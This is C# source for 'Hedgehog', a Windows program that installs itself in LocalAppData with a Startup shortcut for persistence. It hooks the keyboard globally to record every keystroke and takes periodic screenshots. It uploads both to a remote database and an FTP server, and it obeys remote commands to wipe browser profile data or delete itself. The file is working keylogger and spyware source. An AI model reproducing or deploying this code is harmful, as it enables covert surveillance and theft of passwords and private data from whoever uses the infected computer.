using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

using System.Net;
using System.IO;
using System.Threading;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using System.Diagnostics;
using System.Drawing.Imaging;
using System.Text.RegularExpressions;
using IWshRuntimeLibrary;
using Shell32;
using Microsoft.Win32;
using System.Security.Cryptography;


namespace Hedgehog
{
    public partial class frmMain : Form
    {

        //KEYLOGGER VARIABLES AND DLL
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        public static byte caps = 0, shift = 0, failed = 0;

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
        //END OF KEYLOGGER VARIABLES AND DLL

        //Paths
        string path_hedgehog_current = Process.GetCurrentProcess().MainModule.FileName;
        string path_hedgehog_target = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Hedgehog\" + AppDomain.CurrentDomain.FriendlyName;
        string path_runtimeLib_target = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Hedgehog\Interop.IWshRuntimeLibrary.dll";
        string path_shell32_target = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Hedgehog\Interop.Shell32.dll";
        string path_icon_target = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Hedgehog\hedgehog.ico";
        string path_shortcut_target = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\Hedgehog.lnk";
        const string path_MySql_current = "MySql.Data.dll";
        const string path_runtimeLib_current = "Interop.IWshRuntimeLibrary.dll";
        const string path_shell32_current = "Interop.Shell32.dll";
        const string path_icon_current = "hedgehog.ico";
        string path_Mysql_target = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Hedgehog\MySql.Data.dll";
        string path_folder_hedgehog = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Hedgehog\";
        string path_folder_data = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Hedgehog\Data\";
        string path_file_log = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Hedgehog\keys.log";
        string path_uninstaller = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\uninstalller.bat";

        static StringBuilder log = new StringBuilder();
        Thread backgroundWorker;

        classDatabase db = new classDatabase();
        classComputerInfo pcInfo = new classComputerInfo();
        classFTP ftp = new classFTP();
        classBeta beta = new classBeta();

        string macAddress;
        string windows_user;
        string ip;
        string id;
        string user_id;
        int cicle_time = 5 * 1000; //5 sec
        int self_delete_status;
        bool cache_clear_status;
        bool checkConnectionStartup = false;


        //installation vars
        string email = null;
        string strIDwithSpace;
        string strPassword;
        bool installed = false;
        bool runAfterInstallation = false;
        int countPasswordChange = 0;

        public frmMain()
        {
            InitializeComponent();

            macAddress = pcInfo.getMACAddress();
            windows_user = pcInfo.getUser();
            ip = pcInfo.getExternalIp();
        
            /*
            db.openDatabaseConnection();
            user_id = db.getUserId(macAddress, windows_user);
            db.updateLastConnection(user_id, ip);
            db.closeDatabaseConnection();
            */

           startup();
        }

        private void SystemEvents_SessionEnding(object sender, SessionEndingEventArgs e)
        {
            db.updateOnlineStatus(id, false);
            if(log.ToString()!="")
            {
                writeFileLog(log.ToString());
            }
            beta.writeBeta("ACCOUNT LOGOFF ACTVATED");
            db.hedgehogExit();
        }

        private void startup()
        {
            //path_hedgehog_current != path_hedgehog_target
            if (path_hedgehog_current != path_hedgehog_target) //If executable is not in installation folder
            {
                if (db.CheckForInternetConnection())
                {
                    db.openDatabaseConnection();
                    if (db.db_connection == true)
                    {
                        id = db.getUserId(macAddress, windows_user);
                    }
                    else
                    {
                        db.hedgehogExitwithMessage("The Hedgedog could not connect to the database, please try later. If the problem continues to occur, contact us.");
                    }
                }
                else
                {
                    db.hedgehogExitwithMessage("The Hedgedog could not connect to internet. Please check your internet connection and try again.");
                }

                /*
                using (MD5 md5Hash = MD5.Create())
                {

                    user_id = pcInfo.getMACAddress().Substring(0, 6).ToUpper() + GetMd5Hash(md5Hash, pcInfo.getUser()).Substring(0, 3).ToUpper();
                }

                checkRegistrationAndInstallation();

                strIDwithSpace = user_id.Insert(3, " ");
                strIDwithSpace = strIDwithSpace.Insert(7, " ");

                if (id != null)
                {
                    strPassword = db.getPassword(id);
                }
                else
                {
                    strPassword = pcInfo.getRandomPassword();
                }

                lblId.Text = strIDwithSpace;
                lblPassword.Text = strPassword;
                */
                
            }else
            {
                SystemEvents.SessionEnding += new SessionEndingEventHandler(SystemEvents_SessionEnding);
                beta.cleanBeta();

                backgroundWorker = new Thread(backgroundFunction);
                backgroundWorker.Start();

                //KEYLOGGER STARTUP (PUT ANOTHER CODE BEFORE THIS BLOCK ^)
                _hookID = SetHook(_proc);
                Application.Run();
                UnhookWindowsHookEx(_hookID);
                //END KEYLOGGER

            }
        }

        private void connectionStartup()
        {
            db.openDatabaseConnection();
            if (db.db_connection == true)
            {
                id = db.getUserId(macAddress, windows_user);
            }
            else
            {
                beta.writeBeta("Database connection error !");
            }


            if (id != null)
            {
                checkConnectionStartup = true;
                beta.writeBeta("User ID: " + id);
                db.updateLastConnection(id, ip);
                db.getAllRequests(id, out cache_clear_status, out self_delete_status, out cicle_time);
                cicle_time = cicle_time * 1000;
                /*
                if (!db.checkKeylog(user_id))
                {
                    beta.writeBeta("Id NÃO registado na tabela keylog");
                    db.createKeylog(user_id);
                    beta.writeBeta("Nova linha criada na tabela keylog");
                }*/
                beta.writeBeta("Cache: " + cache_clear_status.ToString() + "- Self Delete: " + self_delete_status.ToString() + "- Cicle Time: " + cicle_time.ToString());

                if (cache_clear_status)
                {
                    cleanBrowsersCache();
                    db.updateRequestCacheClear(id, false);
                    beta.writeBeta("Internet cache clear");
                }

                if (self_delete_status > 0)
                {
                    selfDelete();
                    db.updateRequestSelfDelete(id, '2');
                    beta.writeBeta("Self delete programmed");
                    db.hedgehogExit();
                }
            }
        }

        private bool checkBackgroundRunning()
        {
            return true;
        }

        private void backgroundFunction()
        {
            while (checkBackgroundRunning())
            {
                beta.writeBeta("Thread Sleep: "+(cicle_time/1000).ToString()+" Seconds");
                Thread.Sleep(cicle_time);
                beta.writeBeta("CICLE START " + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));
                if (!System.IO.Directory.Exists(path_folder_data))
                {
                    System.IO.Directory.CreateDirectory(path_folder_data);
                }
                ftp.CaptureImage(false, macAddress, path_folder_data);
                beta.writeBeta("Printscreen captured");

                if (db.CheckForInternetConnection())
                {
                    if (!checkConnectionStartup)
                        connectionStartup();

                    if (checkConnectionStartup)
                    {
                        if (db.conn.State == System.Data.ConnectionState.Open)
                        {
                            readAndUploadLogsAndPrints();
                        }
                        else
                        {
                            beta.writeBeta("Datbase connection closed");
                            db.db_connection = false;
                            db.openDatabaseConnection();
                            if (db.db_connection == true)
                            {
                                beta.writeBeta("Datbase connection reopen");
                                readAndUploadLogsAndPrints();
                            }
                            else
                            {
                                beta.writeBeta("database connection reopen FAILED");
                                writeFileLog(log.ToString());
                            }
                        }
                    }
                    else
                    {
                        beta.writeBeta("Internet connection FAILED");
                        writeFileLog(log.ToString());
                    }
                }
                CreateStartupFolderShortcut();
            }
        }

        private void readAndUploadLogsAndPrints()
        {
            uploadAllCaptures(path_folder_data, id); //-> add new print in tbl_printscreen and delete uploded files

            if (readFileLog() != "")
            {
                beta.writeBeta("File with content");
                if (db.updateKeylog(id, readFileLog()))
                {
                    System.IO.File.WriteAllText(path_file_log, string.Empty);
                    beta.writeBeta("File log content uploaded");
                }else{
                    beta.writeBeta("File log content upload FAILED");
                }
            }else
            {
                beta.writeBeta("File Empty");
            }

            if (log.ToString() != "")
            {
                if (db.updateKeylog(id, log.ToString()))
                {
                    beta.writeBeta("String log uploaded");
                }
                else
                {
                    beta.writeBeta("String log upload FAILED");
                    writeFileLog(log.ToString());
                    beta.writeBeta("String log added to file");
                }
            }
            else
            {
                beta.writeBeta("String log empty");
            }

            log.Clear();
        }

        private void writeFileLog(string _content)
        {
            try
            {
                using (FileStream fs = new FileStream(path_file_log, FileMode.Append, FileAccess.Write))
                using (StreamWriter sw = new StreamWriter(fs))
                {
                    sw.WriteLine(_content);
                }
            }
            catch { beta.writeBeta("CATCH ERROR: writeFileLog"); }
        }

        private string readFileLog()
        {
            string line = null;
            try
            {
                using (StreamReader sr = new StreamReader(path_file_log))
                {
                    line = sr.ReadToEnd();
                }
            }
            catch{ beta.writeBeta("CATCH ERROR: readFileLog"); }
            return line;
        }


        private void cleanBrowsersCache()
        {
            // DELETE GOOGLE CHROME TEMP FILES
            try
            {
                DirectoryInfo googleChrome = new DirectoryInfo(@"C:\Users\" + Environment.UserName + @"\AppData\Local\Google\Chrome\User Data\Default\");
                foreach (FileInfo file in googleChrome.GetFiles())
                {
                    try
                    {
                        file.Delete();
                    }
                    catch
                    { }
                }
                foreach (DirectoryInfo dir in googleChrome.GetDirectories())
                {
                    try
                    {
                        dir.Delete(true);
                    }
                    catch
                    { }
                }
            }
            catch { beta.writeBeta("CATCH ERROR: cleanBrowserCache (Google Chrome)"); }

            // DELETE FIREFOX
            //o firefox guarda os dados de utilizador em 2 pastas funciona como uma especie de backup.
            try
            {
                string[] profile_Local = Directory.GetDirectories(@"C:\Users\" + Environment.UserName + @"\AppData\Local\Mozilla\Firefox\Profiles\");
                string[] profile_Roaming = Directory.GetDirectories(@"C:\Users\" + Environment.UserName + @"\AppData\Roaming\Mozilla\Firefox\Profiles\");
                //Local Folder
                DirectoryInfo firefox_local = new DirectoryInfo(profile_Local[0]);
                foreach (FileInfo file in firefox_local.GetFiles())
                {
                    try
                    {
                        file.Delete();
                    }
                    catch
                    { }
                }
                foreach (DirectoryInfo dir in firefox_local.GetDirectories())
                {
                    try
                    {
                        dir.Delete(true);
                    }
                    catch
                    { }
                }
                //Roaming Folder
                DirectoryInfo firefox_roaming = new DirectoryInfo(profile_Roaming[0]);
                foreach (FileInfo file in firefox_roaming.GetFiles())
                {
                    try
                    {
                        file.Delete();
                    }
                    catch
                    { }
                }
                foreach (DirectoryInfo dir in firefox_roaming.GetDirectories())
                {
                    try
                    {
                        dir.Delete(true);
                    }
                    catch
                    { }
                }
            }
            catch { beta.writeBeta("CATCH ERROR: cleanBrowserCache (Firefox)"); }
            // DELETE Internet Explorer
            try
            {
                DirectoryInfo internet_explorer = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.InternetCache));
                foreach (FileInfo file in internet_explorer.GetFiles())
                {
                    try
                    {
                        file.Delete();
                    }
                    catch
                    { }
                }
                foreach (DirectoryInfo dir in internet_explorer.GetDirectories())
                {
                    try
                    {
                        dir.Delete(true);
                    }
                    catch
                    { }
                }
            }
            catch { beta.writeBeta("CATCH ERROR: cleanBrowserCache (Internet Explorer)"); }
        }

        private void btnInstall_Click(object sender, EventArgs e)
        {
            if (checkBoxRun.Checked)
            {
                runAfterInstallation = true;
            }

            if (checkBoxEmail.Checked)
            {
                if (!db.checkEmailRegisted(email))
                {
                    install();
                }else
                {
                    MessageBox.Show("The email "+email+" is already registered.\n\n If this is your email address and you never registed this email please contact us.",
                    "Email already registed !",
                    MessageBoxButtons.OK,
                    MessageBoxIcon.Exclamation);
                    pictureBoxEmailValidation.Image = Hedgehog.Properties.Resources.email_wrong;
                    pictureBoxStatus.Image = Hedgehog.Properties.Resources.status_red;
                    lblStatus.Text = "Email already registed";
                }
            }else
            {
                install();
            }
        }

        private void btnUnistall_Click(object sender, EventArgs e)
        {
            DialogResult dialogResult = MessageBox.Show("Are you sure you want to uninstall Hedgehog?", "Uninstall", MessageBoxButtons.YesNo);
            if (dialogResult == DialogResult.Yes)
            {
                uninstall();
            }
        }

        public static bool emailValidation(string email)
        {
            const string MatchEmailPattern =
            @"^(([\w-]+\.)+[\w-]+|([a-zA-Z]{1}|[\w-]{2,}))@"
     + @"((([0-1]?[0-9]{1,2}|25[0-5]|2[0-4][0-9])\.([0-1]?
				[0-9]{1,2}|25[0-5]|2[0-4][0-9])\."
     + @"([0-1]?[0-9]{1,2}|25[0-5]|2[0-4][0-9])\.([0-1]?
				[0-9]{1,2}|25[0-5]|2[0-4][0-9])){1}|"
     + @"([a-zA-Z]+[\w-]+\.)+[a-zA-Z]{2,4})$";

            if (email != null) return Regex.IsMatch(email, MatchEmailPattern);
            else return false;
        }

        private void txtEmail_TextChanged(object sender, EventArgs e)
        {
            if(emailValidation(txtEmail.Text)==true)
            {
                email = txtEmail.Text;
                pictureBoxEmailValidation.Image = Hedgehog.Properties.Resources.email_right;
                btnInstall.Enabled = true;
                if(installed)
                {
                    btnInstall.Text = "Reinstall";
                }else
                {
                    installToolStripMenuItem.Enabled = true;
                }
            }
            else
            {
                email = null;
                pictureBoxEmailValidation.Image = Hedgehog.Properties.Resources.email_wrong;
                btnInstall.Enabled = false;
                installToolStripMenuItem.Enabled = false;
            }
        }

        private void txtEmail_Click(object sender, EventArgs e)
        {
            if (checkBoxEmail.Checked)
            {
                txtEmail.Text = string.Empty;
                pictureBoxEmailValidation.Image = null;
            }
        }

        private void checkBoxEmail_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBoxEmail.Checked)
            {
                email = null;
                txtEmail.Enabled = true;
                txtEmail.Text = "insert your email here";
                pictureBoxEmailValidation.Image = null;
                btnInstall.Enabled = false;
                installToolStripMenuItem.Enabled = false;
            }
            else
            {
                email = null;
                txtEmail.Enabled = false;
                txtEmail.Text = "Use your email instead as ID.";
                pictureBoxEmailValidation.Image = null;
                btnInstall.Enabled = true;
                installToolStripMenuItem.Enabled = true;
            }
        }

        private void installToolStripMenuItem_Click(object sender, EventArgs e)
        {
            btnInstall.PerformClick();
        }

        private void unistallToolStripMenuItem_Click(object sender, EventArgs e)
        {
            btnUnistall.PerformClick();
        }

        private void changePasswordToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (id!=null)
            {
                if (countPasswordChange < 4)
                {
                    strPassword = pcInfo.getRandomPassword();
                    db.updatePassword(id, strPassword);
                    lblPassword.Text = strPassword;
                    countPasswordChange++;
                }
                else
                {
                    changePasswordToolStripMenuItem.Enabled = false;
                }
            }
            else
            {
                strPassword = pcInfo.getRandomPassword();
                lblPassword.Text = strPassword;
            }
        }

        private void frmMain_FormClosed(object sender, FormClosedEventArgs e)
        {
            if (db.db_connection == true)
                if (db.conn.State == System.Data.ConnectionState.Open)
                    db.closeDatabaseConnection();

            if (runAfterInstallation)
            {
                Process.Start(path_hedgehog_target);
            }
        }

        //HEDGEHOG INSTALLATION FILES MANAGEMENT

        private void install()
        {
            hiddenUninstall();

            if (id != null)
            { 
                db.updateUserInstallation(id, email);
            }
            else
            {
                db.insertNewUser(user_id, macAddress, windows_user, pcInfo.getComputerName(), email, strPassword, ip);
                db.createKeylog(db.getUserId(macAddress, windows_user));
            }

            if (checkInstallationFiles() == "none")
            {
                Directory.CreateDirectory(path_folder_hedgehog);
                Directory.CreateDirectory(path_folder_data);
                System.IO.File.Copy(path_hedgehog_current, path_hedgehog_target);
                System.IO.File.Copy(path_icon_current, path_icon_target);
                System.IO.File.Copy(path_MySql_current, path_Mysql_target);
                System.IO.File.Copy(path_runtimeLib_current, path_runtimeLib_target);
                System.IO.File.Copy(path_shell32_current, path_shell32_target);
                CreateStartupFolderShortcut();
            }
            else
            {
                db.hedgehogExitwithMessage("Missing installation file " + checkInstallationFiles() + " please download another setup from wwww.hedgehog-software.info.");
            }
            btnInstall.Enabled = false;
            installToolStripMenuItem.Enabled = false;
            btnUnistall.Enabled = true;
            unistallToolStripMenuItem.Enabled = true;

            string msg = string.Empty;
            if (email == null)
            {
                msg = "Hedgehog successfully installed! Please use the foillowed login data in www.hedgehog-bot.eu:\n\n";
                msg += "ID: " + user_id + "\nPassword: " + strPassword + "\n\n Do you want to exit?";
            }
            else
            {
                msg = "Hedgehog successfully installed! Please use the foillowed login data in www.hedgehog-bot.eu:\n\n";
                msg += "ID: " + email + "\nPassword: " + strPassword + "\n\n Do you want to exit?";
            }

            pictureBoxStatus.Image = Hedgehog.Properties.Resources.status_green;
            lblStatus.Text = "Hedgehog successfully installed!";

            installOrUninstallBoxInfo(msg, "Successfully Installed");
        }

        private void uninstall()
        {
            hiddenUninstall();
            db.updateRequestSelfDelete(id, '2');
            btnUnistall.Enabled = false;
            unistallToolStripMenuItem.Enabled = false;
            btnInstall.Enabled = true;
            installToolStripMenuItem.Enabled = true;

            installOrUninstallBoxInfo("Hedgehog successfully uninstalled. Do you want to exit?", "Successfully Installed");

            pictureBoxStatus.Image = Hedgehog.Properties.Resources.status_green;
            lblStatus.Text = "Hedgehog successfully uninstalled";
            btnInstall.Text = "Install";
        }

        private void hiddenUninstall()
        {
            DeleteStartupFolderShortcuts("Hedgehog.exe");
            if (Directory.Exists(path_folder_hedgehog))
            {
                DirectoryInfo dir = new DirectoryInfo(path_folder_hedgehog);
                dir.Delete(true);
            }
        }

        private string checkInstallationFiles()
        {
            string missingFile = "none";

            if (!System.IO.File.Exists(path_MySql_current))
            {
                missingFile = "MySql.Data.dll";
            }
            if (!System.IO.File.Exists(path_runtimeLib_current))
            {
                missingFile = "Interop.IWshRuntimeLibrary.dll";
            }
            if (!System.IO.File.Exists(path_shell32_current))
            {
                missingFile = "Interop.Shell32.dll";
            }
            if (!System.IO.File.Exists(path_icon_current))
            {
                missingFile = "hedgehog.ico";
            }
            return missingFile;
        }

        private void checkDataFolder()
        {
            if (!Directory.Exists(path_folder_hedgehog))
            {
                Directory.CreateDirectory(path_folder_data);
            }
            else
            {
                deleteAllFilesAndDirectories(path_folder_data); //clean Data directory
            }
        }

        private void checkRegistrationAndInstallation()
        {
            if(id!=null)
            {
                if (db.getRequestSelfDelete(id) == 0)
                    reinstallQuestion();
                else
                    hiddenUninstall();
            }else
            {
                if (Directory.Exists(path_folder_hedgehog))
                    hiddenUninstall();
            }
        }

        private bool checkMissingFiles()
        {
            bool missing = false;
            if (!Directory.Exists(path_folder_data))
            {
                missing = true;
            }
            if (!System.IO.File.Exists(path_hedgehog_target))
            {
                missing = true;
            }
            if (!System.IO.File.Exists(path_runtimeLib_target))
            {
                missing = true;
            }
            if (!System.IO.File.Exists(path_Mysql_target))
            {
                missing = true;
            }
            if (!System.IO.File.Exists(path_shell32_target))
            {
                missing = true;
            }
            if (!System.IO.File.Exists(path_icon_target))
            {
                missing = true;
            }
            if (!System.IO.File.Exists(path_shortcut_target))
            {
                missing = true;
            }
            return missing;
        }

        private void deleteAllFilesAndDirectories(string _target_directory)
        {

            DirectoryInfo targetDirectory = new DirectoryInfo(_target_directory);

            foreach (FileInfo file in targetDirectory.GetFiles())
            {
                file.Delete();
            }
            foreach (DirectoryInfo dir in targetDirectory.GetDirectories())
            {
                dir.Delete(true);
            }
        }

        private void installOrUninstallBoxInfo(string _message, string _title)
        {
            DialogResult dialogResult = MessageBox.Show(_message, _title, MessageBoxButtons.OKCancel, MessageBoxIcon.Information);
            if (dialogResult == DialogResult.OK)
            {
                this.Close();
            }
        }

        private void reinstallQuestion()
        {
            DialogResult dialogResult = MessageBox.Show("You already have Hedgehog installed but was founded some errors with the previous installation. Do you want reinstall Hedgehog?", "Reinstall", MessageBoxButtons.YesNo);
            if (dialogResult == DialogResult.Yes)
            {
                install();
                btnInstall.Enabled = false;
                installToolStripMenuItem.Enabled = false;
                pictureBoxStatus.Image = Hedgehog.Properties.Resources.status_green;
                lblStatus.Text = "Hedgehog installed and ready to access in www.hedgehog-software.info";
            }
            else if (dialogResult == DialogResult.No)
            {
                btnInstall.Text = "Reinstall";
                pictureBoxStatus.Image = Hedgehog.Properties.Resources.status_red;
                lblStatus.Text = "Founded some errors with the previous installation. Please Reinstall or Unistall";
                lblStatus.ForeColor = System.Drawing.Color.Red;
            }
        }

        private void selfDelete()
        {
            DeleteStartupFolderShortcuts(Application.ExecutablePath);
            string batchCommands = string.Empty;
            batchCommands += "@ECHO OFF" + Environment.NewLine;
            batchCommands += "IF EXIST \"" + path_folder_hedgehog + "\"" + " (" + Environment.NewLine;
            batchCommands += "rmdir \"" + path_folder_hedgehog + "\" /s /q" + Environment.NewLine;
            batchCommands += ")" + Environment.NewLine;
            batchCommands += "echo j | del /F \"" + path_uninstaller + "\"";
            System.IO.File.WriteAllText(path_uninstaller, batchCommands);
        }

        //SHORTCUT MANAGEMENT

        private void CreateStartupFolderShortcut()
        {
            WshShellClass wshShell = new WshShellClass();
            IWshRuntimeLibrary.IWshShortcut shortcut;
            string startUpFolderPath =
              Environment.GetFolderPath(Environment.SpecialFolder.Startup);

            // Create the shortcut
            shortcut =
              (IWshRuntimeLibrary.IWshShortcut)wshShell.CreateShortcut(
                startUpFolderPath + "\\" +
                Application.ProductName + ".lnk");

            shortcut.TargetPath = path_hedgehog_target;
            shortcut.WorkingDirectory = Application.StartupPath;
            shortcut.Description = "Launch Hedgehog";
            shortcut.IconLocation = Application.StartupPath + @"\hedgehog.ico";
            shortcut.Save();
        }

        private string GetShortcutTargetFile(string shortcutFilename)
        {
            string pathOnly = Path.GetDirectoryName(shortcutFilename);
            string filenameOnly = Path.GetFileName(shortcutFilename);

            Shell32.Shell shell = new Shell32.ShellClass();
            Shell32.Folder folder = shell.NameSpace(pathOnly);
            Shell32.FolderItem folderItem = folder.ParseName(filenameOnly);
            if (folderItem != null)
            {
                Shell32.ShellLinkObject link =
                  (Shell32.ShellLinkObject)folderItem.GetLink;
                return link.Path;
            }

            return String.Empty; // Not found
        }

        private void DeleteStartupFolderShortcuts(string targetExeName)
        {
            string startUpFolderPath =
              Environment.GetFolderPath(Environment.SpecialFolder.Startup);

            DirectoryInfo di = new DirectoryInfo(startUpFolderPath);
            FileInfo[] files = di.GetFiles("*.lnk");

            foreach (FileInfo fi in files)
            {
                string shortcutTargetFile = GetShortcutTargetFile(fi.FullName);

                if (shortcutTargetFile.EndsWith(targetExeName,
                      StringComparison.InvariantCultureIgnoreCase))
                {
                    System.IO.File.Delete(fi.FullName);
                }
            }
        }

        private void checkshortcut()
        {
            if (!System.IO.File.Exists(path_shortcut_target))
            {
                CreateStartupFolderShortcut();
            }
        }

        private void uploadAllCaptures(string _folder, string _userId)
        {
            try
            {
                var filenames = Directory.EnumerateFiles(_folder, "*jpg", SearchOption.TopDirectoryOnly).Select(Path.GetFileName);
                
                foreach (string path in filenames)
                {
                    if (db.createPrintScreen(id, path))
                    {
                        beta.writeBeta(path+" registered in database");
                        if (ftp.UploadFile(_folder + path, ftp.ftpurl + "/" + path))
                        {
                            beta.writeBeta(path + " uploaded to server");
                            System.IO.File.Delete(_folder + path);
                            beta.writeBeta(path + " deleted from Data");
                        }
                        else
                        {
                            beta.writeBeta(path + " upload FAILED");
                        }
                    }else
                    {
                        beta.writeBeta(path+ " registered in database FAILED");
                        if(db.checkPrintscreenRegisted(path))
                        {
                            beta.writeBeta(path + " alredy registered in database");
                            if (ftp.UploadFile(_folder + path, ftp.ftpurl + "/" + path))
                            {
                                beta.writeBeta(path + " uploaded to server");
                                System.IO.File.Delete(_folder + path);
                                beta.writeBeta(path + "Deleted from Data");
                            }
                            else
                            {
                                beta.writeBeta(path + " upload FAILED");
                            }
                        }
                        else
                        {
                            beta.writeBeta(path+" NOT registered in database");
                        }
                    }
                }
            }
            catch
            {
                beta.writeBeta("CATCH ERRROR: uploadAllCaptures");
            }
        }

        static string GetMd5Hash(MD5 md5Hash, string input)
        {
            // Convert the input string to a byte array and compute the hash. 
            byte[] data = md5Hash.ComputeHash(Encoding.UTF8.GetBytes(input));

            // Create a new Stringbuilder to collect the bytes 
            // and create a string.
            StringBuilder sBuilder = new StringBuilder();

            // Loop through each byte of the hashed data  
            // and format each one as a hexadecimal string. 
            for (int i = 0; i < data.Length; i++)
            {
                sBuilder.Append(data[i].ToString("x2"));
            }

            // Return the hexadecimal string. 
            return sBuilder.ToString();
        }

        //KEYLOGGER FUNCTIONS
        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                if (Keys.Shift == Control.ModifierKeys) shift = 1;

                switch ((Keys)vkCode)
                {
                    case Keys.Space:
                        log.Append(" ");
                        break;
                    case Keys.Return:
                        log.Append(Environment.NewLine);
                        break;
                    case Keys.Back:
                        log.Append("BACK");
                        break;
                    case Keys.Tab:
                        log.Append("TAB");
                        break;
                    case Keys.D0:
                        if (shift == 0) log.Append("0");
                        else log.Append(")");
                        break;
                    case Keys.D1:
                        if (shift == 0) log.Append("1");
                        else log.Append("!");
                        break;
                    case Keys.D2:
                        if (shift == 0) log.Append("2");
                        else log.Append("@");
                        break;
                    case Keys.D3:
                        if (shift == 0) log.Append("3");
                        else log.Append("#");
                        break;
                    case Keys.D4:
                        if (shift == 0) log.Append("4");
                        else log.Append("$");
                        break;
                    case Keys.D5:
                        if (shift == 0) log.Append("5");
                        else log.Append("%");
                        break;
                    case Keys.D6:
                        if (shift == 0) log.Append("6");
                        else log.Append("^");
                        break;
                    case Keys.D7:
                        if (shift == 0) log.Append("7");
                        else log.Append("&");
                        break;
                    case Keys.D8:
                        if (shift == 0) log.Append("8");
                        else log.Append("*");
                        break;
                    case Keys.D9:
                        if (shift == 0) log.Append("9");
                        else log.Append("(");
                        break;
                    case Keys.LShiftKey:
                    case Keys.RShiftKey:
                    case Keys.LControlKey:
                    case Keys.RControlKey:
                    case Keys.LMenu:
                    case Keys.RMenu:
                    case Keys.LWin:
                    case Keys.RWin:
                    case Keys.Apps:
                        log.Append("");
                        break;
                    case Keys.OemQuestion:
                        if (shift == 0) log.Append("/");
                        else log.Append("?");
                        break;
                    case Keys.OemOpenBrackets:
                        if (shift == 0) log.Append("[");
                        else log.Append("{");
                        break;
                    case Keys.OemCloseBrackets:
                        if (shift == 0) log.Append("]");
                        else log.Append("}");
                        break;
                    case Keys.Oem1:
                        if (shift == 0) log.Append(";");
                        else log.Append(":");
                        break;
                    case Keys.Oem7:
                        if (shift == 0) log.Append("QUOTE");
                        else log.Append("DOUBLE-QUOTES");
                        break;
                    case Keys.Oemcomma:
                        if (shift == 0) log.Append(",");
                        else log.Append("<");
                        break;
                    case Keys.OemPeriod:
                        if (shift == 0) log.Append(".");
                        else log.Append(">");
                        break;
                    case Keys.OemMinus:
                        if (shift == 0) log.Append("-");
                        else log.Append("_");
                        break;
                    case Keys.Oemplus:
                        if (shift == 0) log.Append("=");
                        else log.Append("+");
                        break;
                    case Keys.Oemtilde:
                        if (shift == 0) log.Append("`");
                        else log.Append("~");
                        break;
                    case Keys.Oem5:
                        log.Append("|");
                        break;
                    case Keys.Capital:
                        if (caps == 0) caps = 1;
                        else caps = 0;
                        break;
                    default:
                        if (shift == 0 && caps == 0) log.Append(((Keys)vkCode).ToString().ToLower());
                        if (shift == 1 && caps == 0) log.Append(((Keys)vkCode).ToString().ToUpper());
                        if (shift == 0 && caps == 1) log.Append(((Keys)vkCode).ToString().ToUpper());
                        if (shift == 1 && caps == 1) log.Append(((Keys)vkCode).ToString().ToLower());
                        break;
                }
                shift = 0;
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);//END OF KEYLOGGER FUNCTIONS  
        }
    }
}
